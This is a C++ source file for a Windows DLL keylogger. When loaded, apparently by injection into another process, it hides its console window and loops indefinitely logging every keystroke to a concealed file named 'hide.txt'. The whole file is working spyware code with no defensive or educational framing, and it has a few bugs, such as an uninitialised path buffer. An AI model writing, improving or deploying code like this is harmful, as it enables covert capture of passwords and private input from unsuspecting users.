#include <windows.h>																	// To work with Windows API

#include <iostream>
#include <winuser.h>

#include <iostream>		// To work with input
#include <direct.h>		// To work with files
#include <windows.h>	// To work with Windows API
#include <TlHelp32.h>	// General Functions to help us 

#include <fstream>

using namespace std;

int Save(int key_stroke, char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a + ");

	cout << key_stroke << endl;

	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

char* GetCurrentDir()							// Return the directory of where the application is find
{
	char* szRet = (char*)malloc(MAX_PATH);		// MAX_PATH , Maximum length of full path
	_getcwd(szRet, MAX_PATH);					// Gets the current working directory. 
	return szRet;
}

BOOL WINAPI DllMain(HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)				// BOOL WINAPI DllMain: An optional entry point into a dynamic-link library (DLL). When the system starts or terminates a process or thread, it calls the entry-point function for each loaded DLL using the first thread of the process. The system also calls the entry-point function for a DLL when it is loaded or unloaded using the LoadLibrary and FreeLibrary functions.
{
	int stopCy = 0;
	//char buff[20];
/*	while (stopCy < 1)
	{
		if (fdwReason == DLL_PROCESS_ATTACH)											// If the DLL has loaded into the process(DLL_PROCESS_ATTACH = 1 if loaded and LL_PROCESS_ATTACH = 0 if not)
		{
			MessageBox(0, L"Injected By Anonymous %d", L"Hello World", MB_OK);			// There is L before the text because its wide characters
			stopCy += 1;
		}
	}*/

	Stealth();
	char i;

	char* szDllPath = (char*)malloc(MAX_PATH);
	LPTSTR lpszProc = NULL;
													
	strcat_s(szDllPath, MAX_PATH, "\\");									
	strcat_s(szDllPath, MAX_PATH, "hide.txt");

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
				Save(i, szDllPath);
		}
	}
	system("PAUSE");

	return TRUE;
}



